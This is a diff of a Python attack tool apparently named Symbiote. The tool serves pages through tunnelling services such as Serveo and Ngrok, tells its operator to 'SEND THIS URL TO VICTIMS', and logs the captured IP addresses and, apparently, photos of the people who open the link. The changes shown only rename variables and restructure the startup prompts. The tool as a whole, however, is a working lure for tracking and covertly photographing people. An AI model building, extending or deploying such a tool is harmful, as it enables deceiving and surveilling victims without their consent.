@@ -38,7 +38,7 @@ def div_q():
     system('clear')
     if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
           android_banner()
-          user=1
+          user = '1'
           sleep(7)
           #checkjp2a()
           checkPHP()
@@ -175,7 +175,8 @@ def randomServeo(port):
 
 
 def selectServer(port):
-    global king 
+    global king
+    global kill
     system('clear')
     sbanner()
     print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
@@ -245,7 +246,6 @@ def serveo(name,url,port):
 
 def report(url,port):
     system('clear')
-    global user
     sbanner()
     print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X       {0}]\n\t{0}[{2}     IT TAKES TIME TO RECEIVE PIC      {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
     print("\n{0}[{2}*{0}]{2} SEND THIS URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}HACKING URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
@@ -265,10 +265,10 @@ def report(url,port):
             system('clear')
             system('cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
             fresh()
-            global user
-            if user == 1:
+            global kill
+            if kill == '1':
                 android_end()
-            else:
+            elif kill == '2':
                  end()
             sleep(2)
             exit()
@@ -278,11 +278,21 @@ def report(url,port):
             report(url,port)
 system('clear')
 menu_q()
-div_q()
-#checkjp2a()
-#checkPHP()
-#checkNgrok()
-#checkLocalxpose()    
+global kill
+system('clear')
+if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
+    android_banner()
+    kill = '1'
+    sleep(7)
+else:
+    banner()
+    kill = '2'
+    sleep(7)
+
+checkjp2a()
+checkPHP()
+checkNgrok()
+checkLocalxpose()
 fresh()
 getpath()
 port=selectPort()
